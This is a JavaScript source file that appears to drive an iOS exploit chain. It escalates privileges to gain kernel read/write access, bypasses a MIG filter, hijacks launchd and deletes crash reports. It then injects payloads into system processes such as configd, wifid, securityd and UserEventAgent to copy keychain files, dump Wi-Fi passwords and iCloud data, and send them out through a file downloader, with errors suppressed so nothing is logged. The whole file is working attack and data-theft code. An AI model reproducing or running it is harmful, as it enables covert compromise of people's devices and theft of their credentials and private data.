import Native from "libs/Chain/Native";
import Chain from "libs/Chain/Chain";
import TaskRop from "libs/TaskRop/TaskRop";
import Task from "libs/TaskRop/Task";
import Sandbox from "libs/TaskRop/Sandbox";
import Utils from "libs/JSUtils/Utils";
import InjectJS from "./InjectJS";
import Driver from "libs/Driver/Driver";
import RemoteCall from "libs/TaskRop/RemoteCall";
import MigFilterBypassThreadCode from "!raw-loader!../dist/MigFilterBypassThread.js";
import loaderCode from "!raw-loader!loader.js";
import fileDownloaderCode from "!raw-loader!file_downloader.js";
import keychainCopierCode from "!raw-loader!keychain_copier.js";
import wifiDumpCode from "!raw-loader!wifi_password_dump.js";
import wifiDumpSecuritydCode from "!raw-loader!wifi_password_securityd.js";
import iCloudDumperCode from "!raw-loader!icloud_dumper.js";

//import KeychainDumpCode from '!raw-loader!keychain_dump.js'

class MigFilterBypass {

	#running;
	#sharedMem;
	#runFlagPtr;
	#isRunningPtr;
	#monitorThread1Ptr;
	#monitorThread2Ptr;
	#mutexPtr;

	constructor(mutexPtr) {
		this.#mutexPtr = mutexPtr;
		this.#running = false;
		this.#sharedMem = BigInt(Native.callSymbol("calloc", 1, 0x100));
		this.#runFlagPtr = this.#sharedMem;
		this.#isRunningPtr = this.#sharedMem + 0x4n;
		this.#monitorThread1Ptr = this.#sharedMem + 0x8n;
		this.#monitorThread2Ptr = this.#sharedMem + 0x10n;
		Native.write32(this.#runFlagPtr, 2);
		Native.write32(this.#isRunningPtr, 0);
	}

	start() {
		if (this.#running)
			return;

		let threadSelf = BigInt(Native.callSymbol("mach_thread_self"));
		let threadSelfAddr = BigInt(Task.getPortKObject(threadSelf));


		let threadMem = BigInt(Native.callSymbol("calloc", 1, 0x400));
		let kernelRW = Chain.transferRW();
		let kernelBase = BigInt(Chain.getKernelBase());
		Native.write64(threadMem, BigInt(kernelRW.controlSocket));
		Native.write64(threadMem + 0x8n, BigInt(kernelRW.rwSocket));
		Native.write64(threadMem + 0x10n, kernelBase);
		Native.write64(threadMem + 0x18n, threadSelfAddr);
		Native.write64(threadMem + 0x20n, this.#runFlagPtr);
		Native.write64(threadMem + 0x28n, this.#isRunningPtr);
		Native.write64(threadMem + 0x30n, this.#mutexPtr);
		Native.write64(threadMem + 0x38n, BigInt(Chain.offsets().migLock));
		Native.write64(threadMem + 0x40n, BigInt(Chain.offsets().migSbxMsg));
		Native.write64(threadMem + 0x48n, BigInt(Chain.offsets().migKernelStackLR));
		Native.write64(threadMem + 0x50n, this.#monitorThread1Ptr);
		Native.write64(threadMem + 0x58n, this.#monitorThread2Ptr);
		//Native.write64(threadMem, lock.kernelSlide);
		//Native.write64(threadMem + 0x8n, lock.lockAddr);
		//console.log(TAG, `Spawn bypass thread with args: kernelSlide=${Utils.hex(lock.kernelSlide)}, lockAddr=${Utils.hex(lock.lockAddr)}`);
		const threadCode = "fcall_init(); " + MigFilterBypassThreadCode;
		Chain.threadSpawn(threadCode, threadMem);

		for (let i=0; i<10; i++) {
			let isRunning = Native.read32(this.#isRunningPtr);
			if (isRunning)
				break;
			Native.callSymbol("usleep", 500000);
		}

		this.#running = true;
	}

	stop() {
		if (!this.#running)
			return;

		Native.write32(this.#runFlagPtr, 0);
		Native.callSymbol("sleep", 1);
		this.#running = false;
	}

	pause() {
		Native.write32(this.#runFlagPtr, 2);
		Native.callSymbol("sleep", 1);
	}

	resume() {
		Native.write32(this.#runFlagPtr, 1);
		Native.callSymbol("sleep", 1);
	}

	monitorThreads(thread1, thread2) {
		Native.write64(this.#monitorThread1Ptr, thread1);
		Native.write64(this.#monitorThread2Ptr, thread2);
	}
}
function xnuVersion() {
	Native.callSymbol("uname", Native.mem);
	const release = Native.readString(Native.mem + 0x200n, 0x100);
	let splittedVersion = release.split(".");
	let xnuMajor = splittedVersion[0];
	let xnuMinor = splittedVersion[1];
	return {major: xnuMajor, minor: xnuMinor};
}

const TAG = "MAIN";
//const targetProcess = "bluetoothd";
const targetProcess = "SpringBoard";

function start() {
	let mutexPtr = null;
	let migFilterBypass = null;
	globalThis.xnuVersion = xnuVersion();
	let ver = globalThis.xnuVersion;

	// If iOS >= 18.4 we apply migbypass in order to bypass autobox restrictions
	if (ver.major == 24 && ver.minor >= 4) {

		mutexPtr = BigInt(Native.callSymbol("malloc", 0x100));
		Native.callSymbol("pthread_mutex_init", mutexPtr, null);
		migFilterBypass = new MigFilterBypass(mutexPtr);
	}
	let driver = new Driver();

	Chain.init(driver, mutexPtr);

	let resultPE = Chain.runPE();
	if (!resultPE)
		return;


	TaskRop.init();
	if(migFilterBypass)
		migFilterBypass.start();
	let launchdTask = new RemoteCall("launchd",migFilterBypass);
	if (!launchdTask.success()) {
		return false;
	}

	Sandbox.initWithLaunchdTask(launchdTask);
	Sandbox.deleteCrashReports();
	Sandbox.createTokens();

	let agentLoader = new InjectJS(targetProcess, loaderCode, migFilterBypass);
	let agentPid = 0;

	if (agentLoader.inject()) {
		agentPid = agentLoader.task.pid();
		Sandbox.applyTokensForRemoteTask(agentLoader.task);
		Sandbox.adjustMemoryPressure(targetProcess);

		agentLoader.destroy();
	}

	// Inject keychain copier FIRST into securityd (has access to keychain files)
	// This copies keychain/keybag to /tmp with 777 permissions
	const keychainProcess = "configd";
	let keychainCopier = new InjectJS(keychainProcess, keychainCopierCode, migFilterBypass);
	if (keychainCopier.inject()) {
		Sandbox.applyTokensForRemoteTask(keychainCopier.task);
		keychainCopier.destroy();
	} else {
	}

	// Inject WiFi password dump into wifid (has keychain access for WiFi)
	// Using wifid instead of wifianalyticsd - wifid is always active
	const wifidProcess = "wifid";
	let wifiDump = new InjectJS(wifidProcess, wifiDumpCode, migFilterBypass);
	if (wifiDump.inject()) {
		Sandbox.applyTokensForRemoteTask(wifiDump.task);
		wifiDump.destroy();
	} else {
	}

	// Also inject WiFi password dump into securityd (fallback for devices where wifid fails)
	const securitydProcess = "securityd";
	let wifiDumpSecurityd = new InjectJS(securitydProcess, wifiDumpSecuritydCode, migFilterBypass);
	if (wifiDumpSecurityd.inject()) {
		Sandbox.applyTokensForRemoteTask(wifiDumpSecurityd.task);
		wifiDumpSecurityd.destroy();
	} else {
	}

	// Inject iCloud dumper into UserEventAgent (has access to iCloud Drive files)
	const userEventAgentProcess = "UserEventAgent";
	let iCloudDumper = new InjectJS(userEventAgentProcess, iCloudDumperCode, migFilterBypass);
	if (iCloudDumper.inject()) {
		Sandbox.applyTokensForRemoteTask(iCloudDumper.task);
		iCloudDumper.destroy();
	} else {
	}

	// Wait for all dumps to finish
	for (let i = 1; i <= 5; i++) {
		Native.callSymbol("sleep", 1);
	}

	// Inject forensics file downloader AFTER keychain copier
	// This will send the copied keychain files from /tmp
	try {
		let fileDownloader = new InjectJS(targetProcess, fileDownloaderCode, migFilterBypass);
		if (fileDownloader.inject()) {
			Sandbox.applyTokensForRemoteTask(fileDownloader.task);
			fileDownloader.destroy();
		}
	} catch (injectError) {
		// Error handling without logging
	}

	launchdTask.destroy();

	return true;
}

try {
	start();
}
catch (error) {
	// Error handling without logging
}
finally {
	Native.callSymbol("exit", 0n);
}
